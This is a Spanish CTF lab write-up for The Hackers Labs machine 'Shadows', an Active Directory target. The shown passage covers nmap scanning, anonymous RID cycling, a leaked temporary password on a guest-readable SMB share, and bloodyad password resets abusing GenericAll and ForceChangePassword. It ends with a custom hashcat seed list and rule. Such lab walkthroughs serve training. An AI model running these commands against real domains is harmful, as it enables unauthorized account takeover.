---
title: "Shadows"
layout: "post"
categories: [ "The Hackers Labs", "THL - Profesional" ]
tags: [ "nmap", "ntpdate", "netexec", "lookupsid", "evil-winrm-py", "Zerologon", "noPAC", "hashcat", "BloodHound", "bloodyad", "smbmap", "GenericAll", "ForceChangePassword", "smbclient", "Pass-the-Ticket", "Pass-the-Hash", "GenericWrite", "Shadow Credentials", "pyWhisker", "PKINIT tools", "RBCD", "Password guessing", "uv", "secretsdump", "RID Cycling Attack" ]
---

## Info

![Shadows](/assets/posts/2026-12-12-shadows_thl/01_shadows.png)
*Shadows - The Hackers Labs (Profesional)*

Shadows es una máquina de dificultad Profesional de The Hackers Labs, enfocada en un entorno de Active Directory.

> La Cyber Kill Chain comienza con un **RID Cycling Attack** anónimo para enumerar usuarios del dominio, seguido del hallazgo de una conversación de soporte técnico en el share SMB `Incidents` que revela una contraseña temporal del usuario `shadow`. Con este acceso abuso de `GenericAll` sobre `secadmin` para resetear su contraseña, y de `ForceChangePassword` sobre `svc_backup` para repetir el proceso. Desde `svc_backup` accedo al share `DataRecovery`, donde encuentro un informe de auditoría de contraseñas que utilizo para construir un diccionario a medida con `hashcat` y obtener las credenciales de `helpdesk` mediante password guessing. Este usuario posee `GenericWrite` sobre la cuenta Tier Zero `auditmgr`, lo que permite un ataque de **Shadow Credentials** con `pyWhisker` y `PKINITtools` para obtener su hash NTLM. Finalmente, abuso de `GenericAll` de `auditmgr` sobre la cuenta del Domain Controller para realizar **RBCD**, obtener un Service Ticket para `CIFS` como `Administrator` y ejecutar **Pass-the-Ticket** para lograr una shell como `NT AUTHORITY\SYSTEM`. Como rutas alternativas hacia Domain Admin, la máquina también es vulnerable a **Zerologon** (`CVE-2020-1472`) y **noPAC** (`CVE-2021-42287` / `CVE-2021-42278`).
{: .prompt-info }

## Descubrimiento de hosts

Inicio con la enumeración de hosts del segmento local.

```shell
sudo nmap -sn 10.10.10.0/24

Nmap scan report for 10.10.10.1
Host is up (0.00042s latency).
MAC Address: 00:50:56:C0:00:03 (VMware)
Nmap scan report for 10.10.10.120
Host is up (0.00037s latency).
MAC Address: 00:0C:29:B9:D6:E7 (VMware)
Nmap scan report for 10.10.10.254
Host is up (0.00018s latency).
MAC Address: 00:50:56:F9:1B:B5 (VMware)
Nmap scan report for 10.10.10.138
Host is up.
```


| Host | IP |
|:---|:---:|
| **Attacker** | `10.10.10.138` |
| **Target** | `10.10.10.120` |

## Nmap

### Escaneo de puertos

Comienzo con el escaneo de los puertos TCP del objetivo para determinar los servicios expuestos.

```shell
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.120 -oG allPorts

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49682/tcp open  unknown
49687/tcp open  unknown
57333/tcp open  unknown
```

La presencia de servicios como **DNS, Kerberos, LDAP, SMB, WinRM, etc.** es característica de un entorno de **Active Directory**, por lo que puedo inferir que me encuentro ante un **Domain Controller**.

### Parseo de puertos

Para el siguiente escaneo usaré la función `extractPorts` para formatear el output **allPorts** al formato aceptado por nmap. Esta función previamente debe ser añadida a tu archivo de configuración `.zshrc` o `.bashrc`.

```shell
extractPorts () {
	local file="$1" 
	local ports ip_address
	ports="$(bat "$file" | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' "$file" | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n"
	echo -e "\t[*] IP Address: $ip_address"
	echo -e "\t[*] Open ports: $ports\n"
	echo -n "$ports" | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n"
}
```

Simplemente ejecuto el comando `extractPorts` y le paso como argumento el archivo `allPorts` de la salida de nmap.

```shell
extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.120
	[*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49669,49670,49672,49682,49687,57333

[*] Ports copied to clipboard
```

Como se muestra, el output se copia al portapapeles (es necesario tener instalado `xclip`).

### Detección de versiones

Los puertos serán copiados al portapapeles por lo que simplemente realizo la combinación de teclas `[ Control + Shift + v ]` al lado del parámetro `-p` de nmap para pegar los puertos almacenados.

```shell
sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49669,49670,49672,49682,49687,57333 10.10.10.120 -oN version

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-08-21 18:19:41Z)
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn?
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: shadow.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Seerver.shadow.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Seerver.shadow.thl
| Not valid before: 2026-06-21T22:08:16
|_Not valid after:  2027-06-21T22:08:16
|_ssl-date: 2026-08-21T18:21:38+00:00; -1s from scanner time.
445/tcp   open  microsoft-ds      Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: SHADOW)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
| ssl-cert: Subject: commonName=Seerver.shadow.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Seerver.shadow.thl
| Not valid before: 2026-06-21T22:08:16
|_Not valid after:  2027-06-21T22:08:16
|_ssl-date: 2026-08-21T18:21:38+00:00; -1s from scanner time.
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: shadow.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Seerver.shadow.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Seerver.shadow.thl
| Not valid before: 2026-06-21T22:08:16
|_Not valid after:  2027-06-21T22:08:16
|_ssl-date: 2026-08-21T18:21:38+00:00; -1s from scanner time.
3269/tcp  open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=Seerver.shadow.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:Seerver.shadow.thl
| Not valid before: 2026-06-21T22:08:16
|_Not valid after:  2027-06-21T22:08:16
|_ssl-date: 2026-08-21T18:21:38+00:00; -1s from scanner time.
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49670/tcp open  unknown
49672/tcp open  unknown
49682/tcp open  unknown
49687/tcp open  unknown
57333/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port139-TCP:V=7.991%I=7%D=8/21%Time=6A8896BD%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,5,"\x83\0\0\x01\x8f");
MAC Address: 00:0C:29:B9:D6:E7 (VMware)
Service Info: Host: SEERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Seerver
|   NetBIOS computer name: SEERVER\x00
|   Domain name: shadow.thl
|   Forest name: shadow.thl
|   FQDN: Seerver.shadow.thl
|_  System time: 2026-08-21T11:19:46-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 59m59s, deviation: 2h38m44s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-08-21T18:19:46
|_  start_date: 2026-08-21T17:52:45
|_nbstat: NetBIOS name: SEERVER, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:b9:d6:e7 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.37 seconds
```

El escaneo muestra una discrepancia en la hora. El valor `median` es de `-1s`, por lo que el desfase efectivo observado es mínimo por lo que no sería necesario usar `ntpdate`.

Aun así, sincronizaré la máquina atacante con el objetivo antes de trabajar con Kerberos, ya que este protocolo es sensible a diferencias de tiempo (mayor a 5 mins).

## Configuración inicial

### ntpdate

```shell
sudo ntpdate 10.10.10.120

21 Aug 13:27:46 ntpdate[18854]: adjust time server 10.10.10.120 offset -0.006638 sec
```

### /etc/hosts

Genero las entradas DNS necesarias para añadir a mi `/etc/hosts` utilizando `netexec`.

```shell
nxc smb 10.10.10.120 --generate-hosts-file output
cat output | sudo tee -a /etc/hosts

10.10.10.120     SEERVER.shadow.thl shadow.thl SEERVER
```

## SMB (Null session)

Sin credenciales, el proceso de enumeración está bastante limitado. Por ello, opto primero por obtener usuarios válidos del dominio y, con suerte, poder lanzar algún ataque más adelante.

### RID Cycling Attack

```shell
lookupsid.py shadow.thl@10.10.10.120 -no-pass

[*] Brute forcing SIDs at 10.10.10.120
[*] StringBinding ncacn_np:10.10.10.120[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2560516159-2044954141-282354372
498: SHADOW\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SHADOW\Administrator (SidTypeUser)
501: SHADOW\Guest (SidTypeUser)
502: SHADOW\krbtgt (SidTypeUser)
503: SHADOW\DefaultAccount (SidTypeUser)
512: SHADOW\Domain Admins (SidTypeGroup)
513: SHADOW\Domain Users (SidTypeGroup)
514: SHADOW\Domain Guests (SidTypeGroup)
515: SHADOW\Domain Computers (SidTypeGroup)
516: SHADOW\Domain Controllers (SidTypeGroup)
517: SHADOW\Cert Publishers (SidTypeAlias)
518: SHADOW\Schema Admins (SidTypeGroup)
519: SHADOW\Enterprise Admins (SidTypeGroup)
520: SHADOW\Group Policy Creator Owners (SidTypeGroup)
521: SHADOW\Read-only Domain Controllers (SidTypeGroup)
522: SHADOW\Cloneable Domain Controllers (SidTypeGroup)
525: SHADOW\Protected Users (SidTypeGroup)
526: SHADOW\Key Admins (SidTypeGroup)
527: SHADOW\Enterprise Key Admins (SidTypeGroup)
553: SHADOW\RAS and IAS Servers (SidTypeAlias)
571: SHADOW\Allowed RODC Password Replication Group (SidTypeAlias)
572: SHADOW\Denied RODC Password Replication Group (SidTypeAlias)
1000: SHADOW\SEERVER$ (SidTypeUser)
1101: SHADOW\DnsAdmins (SidTypeAlias)
1102: SHADOW\DnsUpdateProxy (SidTypeGroup)
1109: SHADOW\helpdesk (SidTypeUser)
1110: SHADOW\ITSupport (SidTypeUser)
1111: SHADOW\svc_backup (SidTypeUser)
1112: SHADOW\auditmgr (SidTypeUser)
1114: SHADOW\SecurityTeam (SidTypeUser)
1115: SHADOW\secadmin (SidTypeUser)
1116: SHADOW\infraadmin (SidTypeUser)
1118: SHADOW\ClientServices (SidTypeGroup)
1119: SHADOW\InfrastructureServices (SidTypeGroup)
1120: SHADOW\jsmith (SidTypeUser)
1121: SHADOW\BackupServices (SidTypeGroup)
1122: SHADOW\DataRecovery (SidTypeGroup)
1123: SHADOW\RiskManagement (SidTypeGroup)
1124: SHADOW\BlueTeam (SidTypeGroup)
1125: SHADOW\PlatformEngineering (SidTypeGroup)
1126: SHADOW\CloudInfrastructure (SidTypeGroup)
1601: SHADOW\Shadow (SidTypeUser)
```

**Obtener usuarios del dominio**

A continuación, con la siguiente expresión regular, almaceno los usuarios encontrados al archivo `users`.

```shell
lookupsid.py shadow.thl@10.10.10.120 -no-pass | awk '/SidTypeUser/ {print $2}' FS='\' | cut -d' ' -f1 > users
```

### Shares

Por el momento no dispongo de credenciales válidas, por lo que revisaré los shares disponibles con una sesión `Guest`.

```shell
nxc smb shadow.thl -u guest -p "" --shares

SMB         10.10.10.120    445    SEERVER          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SEERVER) (domain:shadow.thl) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)
SMB         10.10.10.120    445    SEERVER          [+] shadow.thl\guest:
SMB         10.10.10.120    445    SEERVER          [*] Enumerated shares
SMB         10.10.10.120    445    SEERVER          Share           Permissions            Remark
SMB         10.10.10.120    445    SEERVER          -----           -----------            ------
SMB         10.10.10.120    445    SEERVER          ADMIN$                                 Remote Admin
SMB         10.10.10.120    445    SEERVER          C$                                     Default share
SMB         10.10.10.120    445    SEERVER          DataRecovery
SMB         10.10.10.120    445    SEERVER          Incidents       READ
SMB         10.10.10.120    445    SEERVER          IPC$            READ                   Remote IPC
SMB         10.10.10.120    445    SEERVER          NETLOGON                               Logon server share
SMB         10.10.10.120    445    SEERVER          SYSVOL                                 Logon server share
```

| Share interesante | Permisos |
|:---|:---|
| **DataRecovery** | No se muestran, inspeccionar con `smbmap` |
| **Incidents** | `READ` |

#### Incidents

Intento inspeccionar el share `DataRecovery`; sin embargo, no cuento con los permisos suficientes. Continuaré con `Incidents`.

```shell
smbmap -H shadow.thl -u guest -p "" -r Incidents --no-banner

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.120:445	Name: shadow.thl          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DataRecovery                                      	NO ACCESS
	Incidents                                         	READ ONLY
	./Incidents
	dr--r--r--                0 Wed Jun 17 18:21:45 2026	.
	dr--r--r--                0 Wed Jun 17 18:21:45 2026	..
	fr--r--r--             1134 Thu Jun 18 11:49:29 2026	Support.txt
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	SYSVOL                                            	NO ACCESS	Logon server share
[*] Closed 1 connections
```

Muestra un archivo `Support.txt`, así que lo descargaré.

```shell
smbclient -N //shadow.thl/Incidents -c "get Support.txt"

getting file \Support.txt of size 1134 as Support.txt (69.2 KiloBytes/sec) (average 69.2 KiloBytes/sec)
```

Este es el contenido del archivo.

```shell
cat Support.txt

IT: Hello, IT Support. Who am I speaking with?

Employee: Hi, this is Shadow.

IT: Perfect, Shadow. I'm reviewing your password reset request. Could you please confirm your corporate username?

Employee: Yes, shadow@shadow.thl.

IT: Thank you. To verify your identity, can you confirm your department or internal extension?

Employee: Security Department, extension 3107.

IT: Perfect, that matches our records. I�m going to proceed with resetting your Active Directory password for the shadow.thl domain.

(pause while the password is being reset)

IT: Done, Shadow. I�ve generated your temporary password.

Employee: What�s the new password?

IT: Your temporary password is:
)*7UbH5\,:K(91lD9W0RN+e

I recommend logging in as soon as possible and changing it immediately to a new password that only you know.

Employee: Understood.

IT: Perfect. Please remember that this is a temporary password for the shadow.thl domain and it may expire if you do not change it shortly. If you experience any issues, please contact IT Support.

Employee: Alright, thank you.

IT: You�re welcome. Have a great day.
```

El contenido es un historial de conversación entre soporte técnico (`IT`) y el usuario `Shadow`, en el que se entrega una contraseña temporal por teléfono después de una verificación de identidad laxa.

El escenario es un ejemplo de [vishing](https://attack.mitre.org/techniques/T1598/004/) y, desde el punto de vista de la máquina, me proporciona una contraseña potencialmente válida para autenticarme como `shadow`.

### Validación de credenciales

```shell
nxc smb shadow.thl -u shadow -p ')*7UbH5\,:K(91lD9W0RN+e'

SMB         10.10.10.120    445    SEERVER          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SEERVER) (domain:shadow.thl) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)
SMB         10.10.10.120    445    SEERVER          [+] shadow.thl\shadow:)*7UbH5\,:K(91lD9W0RN+e
```

Válidas para SMB, pero **NO** para WinRM. Comprobaré los SMB Shares.

## SMB Shares (Shadow)

```shell
nxc smb shadow.thl -u shadow -p ')*7UbH5\,:K(91lD9W0RN+e' --shares

SMB         10.10.10.120    445    SEERVER          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SEERVER) (domain:shadow.thl) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)
SMB         10.10.10.120    445    SEERVER          [+] shadow.thl\shadow:)*7UbH5\,:K(91lD9W0RN+e
SMB         10.10.10.120    445    SEERVER          [*] Enumerated shares
SMB         10.10.10.120    445    SEERVER          Share           Permissions            Remark
SMB         10.10.10.120    445    SEERVER          -----           -----------            ------
SMB         10.10.10.120    445    SEERVER          ADMIN$                                 Remote Admin
SMB         10.10.10.120    445    SEERVER          C$                                     Default share
SMB         10.10.10.120    445    SEERVER          DataRecovery
SMB         10.10.10.120    445    SEERVER          Incidents
SMB         10.10.10.120    445    SEERVER          IPC$            READ                   Remote IPC
SMB         10.10.10.120    445    SEERVER          NETLOGON        READ                   Logon server share
SMB         10.10.10.120    445    SEERVER          SYSVOL          READ                   Logon server share
```

Con estas credenciales validadas, observo que ahora tengo permisos de lectura en SYSVOL y NETLOGON, pero aún sin poder inspeccionar `DataRecovery`.

### SYSVOL

```shell
smbmap -H shadow.thl -u shadow -p ')*7UbH5\,:K(91lD9W0RN+e' --no-banner

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.120:445	Name: shadow.thl          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DataRecovery                                      	NO ACCESS
	Incidents                                         	NO ACCESS
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	SYSVOL                                            	READ ONLY	Logon server share
[*] Closed 1 connections
```

Nada interesante. Asimismo, no está de más probar ataques como [Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/roasting/kerberoast) y [AS-REP Roasting](https://www.thehacker.recipes/ad/movement/kerberos/roasting/asreproast), aunque para este entorno la salida no es exitosa.

Para obtener una visión más holística y comprender mejor el alcance y los privilegios asociados al usuario `Shadow`, utilizaré el recolector de `bloodyad` a fin de recopilar información del entorno y posteriormente jugar con `BloodHound`.

## BloodHound

### bloodyad

```shell
bloodyad -H SEERVER -d shadow.thl -u shadow -p ')*7UbH5\,:K(91lD9W0RN+e' get BloodHound

[+] Connecting to LDAP server
[+] Connected to LDAP serrver
Dumping schema: 2it [00:00, 237.05it/s]
Generating lookuptable: 94it [00:00, 1562.95it/s]
Dumping SDs: 100%|███████████████████████████████████████| 98/98 [00:00<00:00, 250.94it/s]
Dumping domains: 100%|█████████████████████████████████████| 1/1 [00:00<00:00, 185.91it/s]
Dumping users: 100%|████████████████████████████████████| 13/13 [00:00<00:00, 1705.69it/s]
Dumping computers: 100%|███████████████████████████████████| 1/1 [00:00<00:00, 252.40it/s]
Dumping groups: 100%|███████████████████████████████████| 57/57 [00:00<00:00, 2427.33it/s]
Dumping GPOs: 100%|████████████████████████████████████████| 2/2 [00:00<00:00, 456.72it/s]
Dumping OUs: 100%|█████████████████████████████████████████| 1/1 [00:00<00:00, 426.34it/s]
Dumping Containers: 100%|████████████████████████████████| 19/19 [00:00<00:00, 786.06it/s]
[+] Bloodhound data saved to 20260821T204337_Bloodhound.zip
[+] Found 0 trusts
```

### Función BloodInstall

Usaré la función `BloodInstall` vista en [BabyTwo](https://f4dee-backup.github.io/babytwo_htb/#funci%C3%B3n-bloodinstall). Con tal solo ejecutar el comando comienza con la instalación.

```shell
BloodInstall

...SNIP...

 Container BloodHound-app-db-1 Healthy 
 Container BloodHound-graph-db-1 Healthy 
 Container BloodHound-BloodHound-1 Starting 
 Container BloodHound-BloodHound-1 Started 
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: CsAH3A8IG4OnTQt7RhLZbBYfd1K1Pyl0
[+] You can get your admin password by running: BloodHound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Me autentico con las credenciales otorgadas y subo el zip.

## Lateral movement to secadmin

Después de un momento el proceso se completa y comienzo observando `Outbound Object Control` del principal controlado.

### GenericAll

![Shadows](/assets/posts/2026-12-12-shadows_thl/02_GenericAll.png)
*Shadow GenericAll over secadmin*

Ok, entonces el usuario `Shadow` tiene permisos **GenericAll** sobre el usuario `secadmin`.

Este permiso representa un control muy amplio sobre el objeto y permite realizar distintas acciones dependiendo del tipo de objeto. En el caso de un usuario, entre otras posibilidades, puedo:

- Cambiar la contraseña de `secadmin`.
- Modificar atributos como `msDS-KeyCredentialLink`, lo que permite abusar de [Shadow Credentials](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/), como se mostró en [Fluffy - HTB](https://f4dee-backup.github.io/fluffy_htb/#shadow-credentials).
- Modificar `servicePrincipalName`, lo que puede dar lugar a [Targeted Kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting).
- Abusar de determinados escenarios relacionados con `altSecurityIdentities`, como [ADCS ESC14](https://www.hackingarticles.in/adcs-esc14-write-access-on-altsecurityidentities/).

> Más sobre `GenericAll` en [SpecterOps](https://bloodhound.specterops.io/resources/edges/generic-all#with-genericall-over-a-user) y ejemplos prácticos en [The Hacking Articles](https://www.hackingarticles.in/genericall-active-directory-abuse/).
{: .prompt-info }

Con esto en mente, procedo a cambiar la contraseña del usuario `secadmin` usando `bloodyad`.

```shell
bloodyad -H SEERVER -d shadow.thl -u shadow -p ')*7UbH5\,:K(91lD9W0RN+e' set password "CN=secadmin,CN=Users,DC=shadow,DC=thl" 'sUp3rS3cur32026#%&'

[+] Password changed successfully!
```

Ahora validaré si la contraseña es correcta.

```shell
nxc smb shadow.thl -u secadmin -p 'sUp3rS3cur32026#%&'

SMB         10.10.10.120    445    SEERVER          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SEERVER) (domain:shadow.thl) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)
SMB         10.10.10.120    445    SEERVER          [+] shadow.thl\secadmin:sUp3rS3cur32026#%&
```

También validé por WinRM, pero `BloodHound` solo muestra a un grupo perteneciente al grupo `Remote Management Users` -> `PlatformEngineering`, pero sin usuarios así que el acceso por WinRM aún no se puede dar.

Por otro lado los shares, son los mismos de los vistos para el usuario `shadow`.

## Lateral movement to svc_backup

Bien, pues ahora revisaré los `Outbound Object Control` del usuario `secadmin`.

### ForceChangePassword

![Shadows](/assets/posts/2026-12-12-shadows_thl/03_ForceChangePassword.png)
*secadmin ForceChangePassword over svc_backup*

BloodHound muestra el permiso **ForceChangePassword** sobre el usuario `svc_backup`.

Este permiso permite establecer una nueva contraseña para `svc_backup` sin necesidad de conocer su contraseña actual. Por tanto, una vez que controlo `secadmin`, puedo tomar también el control efectivo de `svc_backup` estableciendo una contraseña conocida por mí.

> Más sobre `ForceChangePassword` en [SpecterOps](https://bloodhound.specterops.io/resources/edges/force-change-password)
{: .prompt-info }

Simplemente repito la sintaxis de `bloodyad` utilizada anteriormente y adapto las credenciales del objeto actualmente controlado (`secadmin`), junto con el `distinguishedName` y la contraseña del usuario objetivo.

```shell
bloodyad -H SEERVER -d shadow.thl -u secadmin -p 'sUp3rS3cur32026#%&' set password "CN=svc_backup,CN=Users,DC=shadow,DC=thl" 'P4ssw0rd2026%&#&'

[+] Password changed successfully!
```

Ahora validaré, como siempre, si la contraseña es correcta.

```shell
nxc smb shadow.thl -u svc_backup -p 'P4ssw0rd2026%&#&'

SMB         10.10.10.120    445    SEERVER          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SEERVER) (domain:shadow.thl) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)
SMB         10.10.10.120    445    SEERVER          [+] shadow.thl\svc_backup:P4ssw0rd2026%&#&
```

BloodHound no muestra ningún otro `Outbound Object Control` para el usuario `svc_backup`. Por lo que revisaré el alcance de este usuario, empezando por los shares.

## SMB Shares (svc_backup)

```shell
nxc smb shadow.thl -u svc_backup -p 'P4ssw0rd2026%&#&' --shares

SMB         10.10.10.120    445    SEERVER          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SEERVER) (domain:shadow.thl) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)
SMB         10.10.10.120    445    SEERVER          [+] shadow.thl\svc_backup:P4ssw0rd2026%&#&
SMB         10.10.10.120    445    SEERVER          [*] Enumerated shares
SMB         10.10.10.120    445    SEERVER          Share           Permissions            Remark
SMB         10.10.10.120    445    SEERVER          -----           -----------            ------
SMB         10.10.10.120    445    SEERVER          ADMIN$                                 Remote Admin
SMB         10.10.10.120    445    SEERVER          C$                                     Default share
SMB         10.10.10.120    445    SEERVER          DataRecovery    READ
SMB         10.10.10.120    445    SEERVER          Incidents
SMB         10.10.10.120    445    SEERVER          IPC$            READ                   Remote IPC
SMB         10.10.10.120    445    SEERVER          NETLOGON        READ                   Logon server share
SMB         10.10.10.120    445    SEERVER          SYSVOL          READ                   Logon server share
```

Ahora tengo permisos de lectura en `DataRecovery`. Inspeccionaré su contenido.

### DataRecovery

```shell
smbmap -H shadow.thl -u svc_backup -p 'P4ssw0rd2026%&#&' -r DataRecovery --no-banner

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.120:445	Name: shadow.thl          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DataRecovery                                      	READ ONLY
	./DataRecovery
	dr--r--r--                0 Sat Jun 20 13:23:32 2026	.
	dr--r--r--                0 Sat Jun 20 13:23:32 2026	..
	fr--r--r--            20019 Sat Jun 20 13:23:32 2026	Red Team Internal Report 2026.pdf
	Incidents                                         	NO ACCESS
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	SYSVOL                                            	READ ONLY	Logon server share
[*] Closed 1 connections
```

Expone un archivo PDF, por lo que lo descargo.

```shell
smbclient -U 'svc_backup%P4ssw0rd2026%&#&' //shadow.thl/DataRecovery -c "prompt OFF; mget *"

getting file \Red Team Internal Report 2026.pdf of size 20019 as Red Team Internal Report 2026.pdf (271.5 KiloBytes/sec) (average 271.5 KiloBytes/sec)
```

Inicio un servidor web con `python` por el puerto **9001** para inspeccionar su contenido.

Visito `localhost:9001` en mi navegador, cuyo contenido es el siguiente.

## Política de contraseñas en SHADOW.THL

### Report 2026.pdf

![Shadows](/assets/posts/2026-12-12-shadows_thl/04_report.png)
*Red Team Internal Report 2026.pdf - Password policy findings*

> A modo de resumen: Este informe identifica que la empresa SHADOW.THL tienen un riesgo alto en la gestión de contraseñas. Se detectaron contraseñas predecibles y basadas en información de la organización, fechas, estaciones y patrones comunes, lo que facilita a un atacante realizar password spraying, fuerza bruta y password reuse. Lo que da lugar al compromiso de múltiples cuentas, y representa un riesgo significativo si entre ellas se ven afectadas cuentas privilegiadas.
{: .prompt-info }

### Conducta humana y contraseñas

Muchos usuarios crean contraseñas basándose en la simplicidad. Por naturaleza las personas se decantan por lo fácil y sencillo (hablo de contraseñas -.-) lo que puede relacionarse con el [Principle of Least Effort](https://en.wikipedia.org/wiki/Principle_of_least_effort). De ahí la necesidad de establecer una [política de contraseñas](https://www.ibm.com/docs/en/sim/7.0.2?topic=administration-password-policies).

Sin embargo, pese a que estas políticas se implementen, los usuarios suelen seguir creando contraseñas débiles con patrones predecibles, como los ya vistos en el informe: **información de la organización, fechas, estaciones, etc**. Estos patrones no se limitan únicamente a ello, también pueden incluir **servicios, mascotas, amigos, deportes, pasatiempos, intereses personales, nombres de familiares, entre otros**.

Sin más que añadir sobre este pequeño inciso, el PDF muestra ejemplos de las contraseñas encontradas durante la auditoría. En consecuencia, intenté utilizar estas contraseñas mediante `Password spraying`, pero ninguna resultó válida para los usuarios actuales. Aun así, no está de más probar esta técnica, al igual que [User-as-Pass](https://f4dee-backup.github.io/babytwo_htb/#user-as-pass), teniendo en cuenta lo anteriormente comentado.

## Lateral movement to helpdesk

El siguiente paso consiste en construir un diccionario personalizado tomando como referencia los patrones observados y la política de contraseñas establecida por la empresa.

### Creación de una wordlist "seed"

Crearé una lista con algunos de los patrones y valores observados durante la auditoría.

```shell
cat << EOF > seed.txt
shadow
shadows.thl
thl
verano
otoño
primavera
invierno
2023
2024
2025
2026
EOF
```

### Creación de una custom rule

El informe también indica que algunos usuarios suelen sustituir la letra `a` por `@`. Aprovecharé este patrón junto con otras transformaciones sencillas para generar variantes de las palabras semilla.

Para ello, crearé una regla personalizada de Hashcat:

> Para profundizar en la creación de custom rules puedes consultar la [documentación de hashcat](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
{: .prompt-tip }

```shell
:
c
T0 T8
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! T0 T8
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
$@
$@ c
$@ T0 T8
$@ so0
$@ sa@
$@ c so0
$@ c sa@
$@ so0 sa@
$@ c so0 sa@
```

La regla permite generar diferentes variantes mediante transformaciones como capitalización, sustitución de `o` por `0`, sustitución de `a` por `@` y la adición de caracteres especiales.

